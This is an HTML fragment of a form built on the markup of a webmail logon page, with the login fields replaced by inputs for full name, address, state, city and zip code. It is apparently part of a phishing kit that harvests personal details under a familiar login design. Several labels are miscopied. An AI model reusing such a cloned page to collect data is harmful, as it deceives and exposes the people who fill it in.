...
<div id="mainLogonDiv" class="tnarrow">
	...
	<div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
        ...
        <br></br>
		<div class="signInInputLabel" id="userNameLabel" aria-hidden="false">Full Name :</div>
		<div><input id="fllname" name="fllname" class="signInInputText" type="text" role="textbox" aria-labelledby="userNameLabel" placeholder="Full Name"></div>

		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Address :</div>
		<div><input id="address" onfocus="g_fFcs=0" name="address" value="" type="text" class="signInInputText" aria-labelledby="passwordLabel" placeholder="Address"></div>

        <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">State :</div>
		<div><input id="state" onfocus="g_fFcs=0" name="state" value="" type="text" class="signInInputText" aria-labelledby="passwordLabel" placeholder="State"></div>

		   <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">State :</div>
		<div><input id="city" onfocus="g_fFcs=0" name="city" value="" type="text" class="signInInputText" aria-labelledby="passwordLabel" placeholder="City"></div>


		   <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">State :</div>
		<div><input id="zipcd" onfocus="g_fFcs=0" name="zipcd" maxlength="15" value="" type="tel" class="signInInputText" aria-labelledby="passwordLabel" placeholder="Zip Code"></div>
